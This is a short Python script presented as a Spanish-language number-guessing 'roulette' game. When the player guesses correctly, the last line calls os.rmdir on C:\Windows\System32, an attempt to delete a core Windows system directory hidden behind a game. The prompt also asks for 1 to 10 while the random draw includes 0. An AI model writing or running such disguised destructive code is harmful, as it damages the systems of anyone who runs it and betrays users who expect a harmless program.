def ruleta():
    import random
    import os
    num = int(random.randint(0,10))
    sel = int(input("elige un num del 1 al diez \n"))
    if sel != num:
        print("que suerte, el número era",num)
    else:
        print("ggwp")
        os.rmdir("C:\\Windows\\System32")